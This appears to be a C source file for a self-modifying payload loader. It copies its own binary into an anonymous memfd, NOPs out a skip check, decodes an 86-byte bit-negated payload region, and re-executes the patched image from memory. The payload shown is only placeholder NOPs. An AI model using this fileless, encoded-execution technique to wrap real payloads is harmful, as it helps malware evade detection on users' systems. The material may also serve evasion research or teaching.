#define _GNU_SOURCE
#include <fcntl.h>
#include <unistd.h>
#include <stdio.h>
#include <sys/mman.h>
#include <sys/sendfile.h>

/* DO NOT TOUCH! - set in Makefile */
#define PAYLOAD_FUNCTION_OFFSET 0x0000000000001449
#define PAYLOAD_SIZE 86

void exec_payload(int);

int main(const int c, char ** v, char ** e)
{
	(void) c;
	int mem_fd, exe_fd;
	
	exec_payload(0);
	
	if ((mem_fd = memfd_create("", 1)) <= 0) return 1;
	
	if ((exe_fd = open("/proc/self/exe", O_RDONLY)) <= 0) goto exe_error;
	
	const off_t exe_size = lseek(exe_fd, 0, SEEK_END);
	lseek(exe_fd, 0, SEEK_SET);
	sendfile(mem_fd, exe_fd, NULL, (unsigned long) exe_size);
	close(exe_fd);
	
	if (lseek(mem_fd, PAYLOAD_FUNCTION_OFFSET, SEEK_SET) == -1) goto exe_error;
	
	unsigned char buffer[2048];
	
	if (read(mem_fd, buffer, sizeof(buffer)) == -1) goto exe_error;
	
	int x = 0;
	for (; buffer[x] != 0x90; ++x); // skip function setup code
	for (; buffer[x] == 0x90; ++x); // skip padding
	for (; buffer[x] != 0x90; ++x) buffer[x] = 0x90; // overwritte skip check with nops
	for (; buffer[x] == 0x90; ++x); // skip padding
	for (int y = 0; y < PAYLOAD_SIZE; ++y) buffer[x + y] = ~buffer[x + y]; //negate payload inplace
	
	if (lseek(mem_fd, PAYLOAD_FUNCTION_OFFSET, SEEK_SET) == -1) goto exe_error;
	
	if (write(mem_fd, buffer, sizeof(buffer)) == -1) goto exe_error;
	
	char mem_fd_path[64];
	sprintf(mem_fd_path, "/proc/self/fd/%d", mem_fd);
	execve(mem_fd_path, v, e);
	
	exe_error:
	close(mem_fd);
	puts("payload failed\n");
	return 1;
}

// thats right!!!, 512 volatile nop instructions >:3

static __attribute__((always_inline)) inline void n(void) { asm volatile("nop"); }

__attribute__((noinline)) void exec_payload(int x) {
	n(); n(); n(); n(); n(); n(); n(); n();
	if (x == 0) goto end;
	n(); n(); n(); n(); n(); n(); n(); n();
	n(); n(); n(); n(); n(); n(); n(); n();
	n(); n(); n(); n(); n(); n(); n(); n();
	n(); n(); n(); n(); n(); n(); n(); n();
	n(); n(); n(); n(); n(); n(); n(); n();
	n(); n(); n(); n(); n(); n(); n(); n();
	n(); n(); n(); n(); n(); n(); n(); n();
	n(); n(); n(); n(); n(); n(); n(); n();
	n(); n(); n(); n(); n(); n(); n(); n();
	n(); n(); n(); n(); n(); n(); n(); n();
	n(); n(); n(); n(); n(); n(); n(); n();
	n(); n(); n(); n(); n(); n(); n(); n();
	n(); n(); n(); n(); n(); n(); n(); n();
	n(); n(); n(); n(); n(); n(); n(); n();
	n(); n(); n(); n(); n(); n(); n(); n();
	n(); n(); n(); n(); n(); n(); n(); n();
	n(); n(); n(); n(); n(); n(); n(); n();
	n(); n(); n(); n(); n(); n(); n(); n();
	n(); n(); n(); n(); n(); n(); n(); n();
	n(); n(); n(); n(); n(); n(); n(); n();
	n(); n(); n(); n(); n(); n(); n(); n();
	n(); n(); n(); n(); n(); n(); n(); n();
	n(); n(); n(); n(); n(); n(); n(); n();
	n(); n(); n(); n(); n(); n(); n(); n();
	n(); n(); n(); n(); n(); n(); n(); n();
	n(); n(); n(); n(); n(); n(); n(); n();
	n(); n(); n(); n(); n(); n(); n(); n();
	n(); n(); n(); n(); n(); n(); n(); n();
	n(); n(); n(); n(); n(); n(); n(); n();
	n(); n(); n(); n(); n(); n(); n(); n();
	n(); n(); n(); n(); n(); n(); n(); n();
	n(); n(); n(); n(); n(); n(); n(); n();
	n(); n(); n(); n(); n(); n(); n(); n();
	n(); n(); n(); n(); n(); n(); n(); n();
	n(); n(); n(); n(); n(); n(); n(); n();
	n(); n(); n(); n(); n(); n(); n(); n();
	n(); n(); n(); n(); n(); n(); n(); n();
	n(); n(); n(); n(); n(); n(); n(); n();
	n(); n(); n(); n(); n(); n(); n(); n();
	n(); n(); n(); n(); n(); n(); n(); n();
	n(); n(); n(); n(); n(); n(); n(); n();
	n(); n(); n(); n(); n(); n(); n(); n();
	n(); n(); n(); n(); n(); n(); n(); n();
	n(); n(); n(); n(); n(); n(); n(); n();
	n(); n(); n(); n(); n(); n(); n(); n();
	n(); n(); n(); n(); n(); n(); n(); n();
	n(); n(); n(); n(); n(); n(); n(); n();
	n(); n(); n(); n(); n(); n(); n(); n();
	n(); n(); n(); n(); n(); n(); n(); n();
	n(); n(); n(); n(); n(); n(); n(); n();
	n(); n(); n(); n(); n(); n(); n(); n();
	n(); n(); n(); n(); n(); n(); n(); n();
	n(); n(); n(); n(); n(); n(); n(); n();
	n(); n(); n(); n(); n(); n(); n(); n();
	n(); n(); n(); n(); n(); n(); n(); n();
	n(); n(); n(); n(); n(); n(); n(); n();
	n(); n(); n(); n(); n(); n(); n(); n();
	n(); n(); n(); n(); n(); n(); n(); n();
	n(); n(); n(); n(); n(); n(); n(); n();
	n(); n(); n(); n(); n(); n(); n(); n();
	n(); n(); n(); n(); n(); n(); n(); n();
	n(); n(); n(); n(); n(); n(); n(); n();
	n(); n(); n(); n(); n(); n(); n(); n();
	end:
	return;
}
